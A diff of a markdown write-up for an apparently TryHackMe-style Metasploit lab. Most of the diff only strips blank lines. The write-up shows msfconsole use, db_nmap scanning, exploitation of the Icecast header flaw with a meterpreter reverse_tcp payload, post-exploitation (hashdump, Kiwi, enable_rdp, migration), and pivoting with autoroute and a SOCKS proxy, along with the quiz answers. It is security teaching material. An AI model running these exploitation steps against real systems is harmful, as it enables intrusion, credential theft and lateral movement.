@@ -4,7 +4,6 @@ Learn to use Metasploit, a tool to probe and exploit vulnerabilities on networks
 
 ![](https://i.imgur.com/98BESj9.png)
 
-
 ###  Intro
 
 Metasploit, an open-source pentesting framework, is a powerful tool utilized by security engineers around the world. Maintained by Rapid 7, Metasploit is a collection of not only thoroughly tested exploits but also auxiliary and post-exploitation tools. Throughout this room, we will explore the basics of using this massive framework and a few of the modules it includes. 
@@ -77,7 +76,6 @@ Console options:
     -x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)
     -h, --help                       Show this message
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ msfconsole -v
 Framework Version: 6.2.26-dev
@@ -86,7 +84,6 @@ Framework Version: 6.2.26-dev
 └─$ msfconsole -q
 msf6 > db_status
 [*] Connected to msf. Connection type: postgresql.
-
 
 ```
 
@@ -112,7 +109,6 @@ After Metasploit has started, let's go ahead and check that we've connected to t
 These commands can also all be found in the 'Database Backend Commands' section of the msfconsole help menu (once you've started msf)
 
  Completed
-
 
 Cool! We've connected to the database, which type of database does Metasploit 5 use?
 
@@ -168,7 +164,6 @@ Core Commands
     unsetg        Unsets one or more global variables
     version       Show the framework and console library version numbers
 
-
 Module Commands
 ===============
 
@@ -191,7 +186,6 @@ Module Commands
     show          Displays modules of a given type, or all modules
     use           Interact with a module by name or search term/index
 
-
 Job Commands
 ============
 
@@ -202,7 +196,6 @@ Job Commands
     kill          Kill a job
     rename_job    Rename a job
 
-
 Resource Script Commands
 ========================
 
@@ -210,7 +203,6 @@ Resource Script Commands
     -------       -----------
     makerc        Save commands entered since start to a file
     resource      Run the commands stored in a file
-
 
 Database Backend Commands
 =========================
@@ -239,14 +231,12 @@ Database Backend Commands
     vulns             List all vulnerabilities in the database
     workspace         Switch between database workspaces
 
-
 Credentials Backend Commands
 ============================
 
     Command       Description
     -------       -----------
     creds         List all credentials in the database
-
 
 Developer Commands
 ==================
@@ -260,7 +250,6 @@ Developer Commands
     pry           Open the Pry debugger on the current module or Framework
     reload_lib    Reload Ruby library files from specified paths
     time          Time how long it takes to run a particular command
-
 
 msfconsole
 ==========
@@ -322,7 +311,6 @@ Usage: search [<options>] [<keywords>:<value>]
 Prepending a value with '-' will exclude any matching results.
 If no options or keywords are provided, cached results are displayed.
 
-
 OPTIONS:
 
     -h, --help                      Help banner
@@ -369,7 +357,6 @@ Examples:
   search cve:2009 -s name
   search type:exploit -s type -r
 
-
 msf6 > search aka:blue
 
 Matching Modules
@@ -386,7 +373,6 @@ Matching Modules
    6  exploit/windows/local/cve_2020_0796_smbghost    2020-03-13       good     Yes    SMBv3 Compression Buffer Overflow
    7  exploit/windows/smb/cve_2020_0796_smbghost      2020-03-13       average  Yes    SMBv3 Compression Buffer Overflow
 
-
 Interact with a module by name or index. For example info 7, use 7 or use exploit/windows/smb/cve_2020_0796_smbghost
 
 msf6 > search date:2018-01-16
@@ -397,7 +383,6 @@ Matching Modules
    #  Name                                         Disclosure Date  Rank    Check  Description
    -  ----                                         ---------------  ----    -----  -----------
    0  exploit/linux/local/glibc_realpath_priv_esc  2018-01-16       normal  Yes    glibc 'realpath()' Privilege Escalation
-
 
 Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/local/glibc_realpath_priv_esc
 
@@ -457,7 +442,6 @@ References:
 Also known as:
   RationalLove.c
 
-
 View the full module info with the info -d command.
 
 ┌──(witty㉿kali)-[~/D┌──(witty㉿kali)-[~/Downloads]
@@ -508,7 +492,6 @@ msf6 > banner
                  ;@'. __*__,."    \|--- \_____________/
                   '(.,...."/
 
-
        =[ metasploit v6.2.26-dev                          ]
 + -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
 + -- --=[ 951 payloads - 45 encoders - 11 nops            ]
@@ -528,7 +511,6 @@ msf6 > banner
                \   _____  |  *
                 |||   WW|||
                 |||     |||
-
 
        =[ metasploit v6.2.26-dev                          ]
 + -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
@@ -562,8 +544,6 @@ msf6 > banner
                   `.`.<
                     `-'
 
-
-
        =[ metasploit v6.2.26-dev                          ]
 + -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
 + -- --=[ 951 payloads - 45 encoders - 11 nops            ]
@@ -589,7 +569,6 @@ msf6 > banner
     || ||
     |\_/|
     \___/
-
 
        =[ metasploit v6.2.26-dev                          ]
 + -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
@@ -623,7 +602,6 @@ MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
 MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
         https://metasploit.com
 
-
        =[ metasploit v6.2.26-dev                          ]
 + -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
 + -- --=[ 951 payloads - 45 encoders - 11 nops            ]
@@ -642,7 +620,6 @@ IIIIII    dTb.dTb        _.---._
 IIIIII     'YvP'       `-.__|__.-'
 
 I love shells --egypt
-
 
        =[ metasploit v6.2.26-dev                          ]
 + -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
@@ -670,7 +647,6 @@ msf6 > banner
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-
 
        =[ metasploit v6.2.26-dev                          ]
 + -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
@@ -742,8 +718,6 @@ msf6 > banner
 *superusers*H@rdT0R3m3b3r*operators*NULL*stuxCTF*mHackresciallo*Eclipse*Gingabeast*Hamad*Immortals*arasan*MouseTrap*
 *damn_sadboi*tadaaa*null2root*HowestCSP*fezfezf*LordVader*Fl@g_Hunt3rs*bluenet*P@Ge2mE*
 
-
-
        =[ metasploit v6.2.26-dev                          ]
 + -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
 + -- --=[ 951 payloads - 45 encoders - 11 nops            ]
@@ -781,7 +755,6 @@ Call trans opt: received. 2-19-98 13:24:18 REC:Loc
                   ``-..__``--`
 
                              https://metasploit.com
-
 
        =[ metasploit v6.2.26-dev                          ]
 + -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
@@ -952,7 +925,6 @@ lport=4444
 
 ```
 
-
 Let's go ahead and start exploring the help menu. On the Metasploit prompt (where we'll be at after we start Metasploit using msfconsole), type the command: `help`
 
  Completed
@@ -1010,7 +982,6 @@ When performing a penetration test it's quite common to record your screen eithe
 Leaving a Metasploit console running isn't always convenient and it can be helpful to have all of our previously set values load when starting up Metasploit. What command can we use to store the settings/active datastores from Metasploit to a settings file? This will save within your msf4 (or msf5) directory and can be undone easily by simply removing the created settings file.
 
 *save*
-
 
 ### Modules for Every Occasion!
 
@@ -1174,7 +1145,6 @@ host          port   proto  name               state     info
 10.10.89.131  49159  tcp    msrpc              open      Microsoft Windows RPC
 10.10.89.131  49160  tcp    msrpc              open      Microsoft Windows RPC
 
-
 MSRPC stands for Microsoft Remote Procedure Call, which is a protocol used for interprocess communication (IPC) between distributed systems in a network. MSRPC is based on the RPC protocol, which allows a process to execute a code in another process or machine without requiring the developer to explicitly manage the communication details.
 
 In Microsoft Windows, MSRPC is a critical component of the Distributed Component Object Model (DCOM), which enables communication between components running on different machines in a network. DCOM uses MSRPC to manage the communication between client and server components, allowing applications to share data and resources across the network.
@@ -1207,7 +1177,6 @@ Matching Modules
    #  Name                                 Disclosure Date  Rank   Check  Description
    -  ----                                 ---------------  ----   -----  -----------
    0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
-
 
 Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
 
@@ -1267,7 +1236,6 @@ References:
   http://www.securityfocus.com/bid/11271
   http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html
 
-
 View the full module info with the info -d command.
 
 msf6 exploit(windows/http/icecast_header) > search multi/handler
@@ -1287,7 +1255,6 @@ Matching Modules
    7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
    8  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
 
-
 Interact with a module by name or index. For example info 8, use 8 or use exploit/linux/local/yum_package_manager_persistence
 
 msf6 exploit(windows/http/icecast_header) > use 5
@@ -1306,7 +1273,6 @@ Module options (exploit/multi/handler):
    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
 
-
 Payload options (windows/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
@@ -1317,14 +1283,11 @@ Payload options (windows/meterpreter/reverse_tcp):
                                         be specified)
    LPORT     4444             yes       The listen port
 
-
 Exploit target:
 
    Id  Name
    --  ----
    0   Wildcard Target
-
-
 
 View the full module info with the info, or info -d command.
 
@@ -1337,7 +1300,6 @@ Matching Modules
    #  Name                                 Disclosure Date  Rank   Check  Description
    -  ----                                 ---------------  ----   -----  -----------
    0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
-
 
 Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
 
@@ -1355,7 +1317,6 @@ Module options (exploit/windows/http/icecast_header):
                                       ing-Metasploit
    RPORT   8000             yes       The target port (TCP)
 
-
 Payload options (windows/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
@@ -1366,14 +1327,11 @@ Payload options (windows/meterpreter/reverse_tcp):
                                         be specified)
    LPORT     4444             yes       The listen port
 
-
 Exploit target:
 
    Id  Name
    --  ----
    0   Automatic
-
-
 
 View the full module info with the info, or info -d command.
 
@@ -1402,7 +1360,6 @@ Active sessions
   1         meterpreter x86/wind  Dark-PC\Dark @ DARK-  10.8.19.103:4444 -> 1
             ows                   PC                    0.10.89.131:49249 (10
                                                         .10.89.131)
-
 
 msf6 exploit(windows/http/icecast_header) > sessions -i 1
 [*] Starting interaction with 1...
@@ -1455,7 +1412,6 @@ Core Commands
     uuid                      Get the UUID for the current session
     write                     Writes data to a channel
 
-
 Stdapi: File system Commands
 ============================
 
@@ -1485,7 +1441,6 @@ Stdapi: File system Commands
     show_mount    List all mount points/logical drives
     upload        Upload a file or directory
 
-
 Stdapi: Networking Commands
 ===========================
 
@@ -1499,7 +1454,6 @@ Stdapi: Networking Commands
     portfwd       Forward a local port to a remote service
     resolve       Resolve a set of host names on the target
     route         View and modify the routing table
-
 
 Stdapi: System Commands
 =======================
@@ -1530,7 +1484,6 @@ Stdapi: System Commands
     suspend       Suspends or resumes a list of processes
     sysinfo       Gets information about the remote system, such as OS
 
-
 Stdapi: User interface Commands
 ===============================
 
@@ -1551,7 +1504,6 @@ Stdapi: User interface Commands
     setdesktop     Change the meterpreters current desktop
     uictl          Control some of the user interface components
 
-
 Stdapi: Webcam Commands
 =======================
 
@@ -1563,14 +1515,12 @@ Stdapi: Webcam Commands
     webcam_snap    Take a snapshot from the specified webcam
     webcam_stream  Play a video stream from the specified webcam
 
-
 Stdapi: Audio Output Commands
 =============================
 
     Command       Description
     -------       -----------
     play          play a waveform audio file (.wav) on the target system
-
 
 Priv: Elevate Commands
 ======================
@@ -1579,14 +1529,12 @@ Priv: Elevate Commands
     -------       -----------
     getsystem     Attempt to elevate your privilege to that of local system.
 
-
 Priv: Password database Commands
 ================================
 
     Command       Description
     -------       -----------
     hashdump      Dumps the contents of the SAM database
-
 
 Priv: Timestomp Commands
 ========================
@@ -1595,13 +1543,11 @@ Priv: Timestomp Commands
     -------       -----------
     timestomp     Manipulate file MACE attributes
 
-
 ```
 
 Metasploit comes with a built-in way to run nmap and feed it's results directly into our database. Let's run that now by using the command `db_nmap -sV MACHINE_IP`
 
 You can add a '-vv' flag to this if you're impatient like me and like to see results
-
 
 What service does nmap identify running on **port 135?**
 
@@ -1662,7 +1608,6 @@ Once we've started this, we can check all of the jobs running on the system by r
 After we've established our connection in the next task, we can list all of our sessions using the command `sessions`. Similarly, we can interact with a target session using the command `sessions -i SESSION_NUMBER`  
 
  Completed
-
 
 ### We're in, now what?
 
@@ -1846,7 +1791,6 @@ Core Commands
     uuid                      Get the UUID for the current session
     write                     Writes data to a channel
 
-
 Stdapi: File system Commands
 ============================
 
@@ -1876,7 +1820,6 @@ Stdapi: File system Commands
     show_mount    List all mount points/logical drives
     upload        Upload a file or directory
 
-
 Stdapi: Networking Commands
 ===========================
 
@@ -1890,7 +1833,6 @@ Stdapi: Networking Commands
     portfwd       Forward a local port to a remote service
     resolve       Resolve a set of host names on the target
     route         View and modify the routing table
-
 
 Stdapi: System Commands
 =======================
@@ -1919,7 +1861,6 @@ Stdapi: System Commands
     suspend       Suspends or resumes a list of processes
     sysinfo       Gets information about the remote system, such as OS
 
-
 Stdapi: User interface Commands
 ===============================
 
@@ -1939,7 +1880,6 @@ Stdapi: User interface Commands
     setdesktop     Change the meterpreters current desktop
     uictl          Control some of the user interface components
 
-
 Stdapi: Webcam Commands
 =======================
 
@@ -1951,14 +1891,12 @@ Stdapi: Webcam Commands
     webcam_snap    Take a snapshot from the specified webcam
     webcam_stream  Play a video stream from the specified webcam
 
-
 Stdapi: Audio Output Commands
 =============================
 
     Command       Description
     -------       -----------
     play          play a waveform audio file (.wav) on the target system
-
 
 Priv: Elevate Commands
 ======================
@@ -1967,7 +1905,6 @@ Priv: Elevate Commands
     -------       -----------
     getsystem     Attempt to elevate your privilege to that of local system.
 
-
 Priv: Password database Commands
 ================================
 
@@ -1975,14 +1912,12 @@ Priv: Password database Commands
     -------       -----------
     hashdump      Dumps the contents of the SAM database
 
-
 Priv: Timestomp Commands
 ========================
 
     Command       Description
     -------       -----------
     timestomp     Manipulate file MACE attributes
-
 
 Kiwi Commands
 =============
@@ -2028,7 +1963,6 @@ IPv4 Netmask : 255.0.0.0
 IPv6 Address : ::1
 IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
 
-
 Interface 12
 ============
 Name         : Microsoft ISATAP Adapter
@@ -2036,7 +1970,6 @@ Hardware MAC : 00:00:00:00:00:00
 MTU          : 1280
 IPv6 Address : fe80::5efe:a0a:5983
 IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
-
 
 Interface 13
 ============
@@ -2119,7 +2052,6 @@ meterpreter > run post/multi/recon/local_exploit_suggester
  40  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
  41  exploit/windows/local/webexec                                  No                       The check raised an exception.
 
-
 meterpreter > run post/windows/manage/enable_rdp
 
 [-] Insufficient privileges, Remote Desktop Service was not modified
@@ -2177,7 +2109,6 @@ Success.
 
 meterpreter > getuid
 Server username: Dark-PC\Dark
-
 
 meterpreter > getprivs
 
@@ -2394,10 +2325,7 @@ dir /a
                2 File(s)            303 bytes
                2 Dir(s)  20,011,905,024 bytes free
 
-
 ```
-
-![[Pasted image 20230228170216.png]]
 
 First things first, our initial shell/process typically isn't very stable. Let's go ahead and attempt to move to a different process. First, let's list the processes using the command `ps`. What's the name of the spool service?
 
@@ -2461,7 +2389,6 @@ One quick extra question, what command can we run in our meterpreter session to 
 
 *shell*
 
-
 ### Makin' Cisco Proud
 
 Last but certainly not least, let's take a look at the autorouting options available to us in Metasploit. While our victim machine may not have multiple network interfaces (NICs), we'll walk through the motions of pivoting through our victim as if it did have access to extra networks.
@@ -2519,7 +2446,6 @@ Matching Modules
    1  auxiliary/server/socks_unc                                normal  No     SOCKS Proxy UNC Path Redirection
    2  auxiliary/scanner/http/sockso_traversal  2012-03-14       normal  No     Sockso Music Host Server 1.5 Directory Traversal
 
-
 Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/http/sockso_traversal
 
 msf6 > use 0
@@ -2538,7 +2464,6 @@ Module options (auxiliary/server/socks_proxy):
    VERSION  5                yes       The SOCKS version to use (Accep
                                        ted: 4a, 5)
 
-
    When VERSION is 5:
 
    Name      Current Setting  Required  Description
@@ -2548,14 +2473,11 @@ Module options (auxiliary/server/socks_proxy):
    USERNAME                   no        Proxy username for SOCKS5 list
                                         ener
 
-
 Auxiliary action:
 
    Name   Description
    ----   -----------
    Proxy  Run a SOCKS proxy server
-
-
 
 View the full module info with the info, or info -d command.
 
@@ -2591,7 +2513,6 @@ PORT    STATE SERVICE VERSION
 135/tcp open  msrpc   Microsoft Windows RPC
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
-
 ```
 
 Let's go ahead and run the command `run autoroute -h`, this will pull up the help menu for autoroute. What command do we run to add a route to the following subnet: 172.18.1.0/24? Use the `-n` flag in your answer.
@@ -2605,7 +2526,5 @@ Additionally, we can start a socks5 proxy server out of this session. Background
 Once we've started a socks server we can modify our _/etc/proxychains.conf_ file to include our new server. What command do we prefix our commands (outside of Metasploit) to run them through our socks5 server with proxychains?
 
 *proxychains*
-
-
 
 [[Oh My WebServer]]
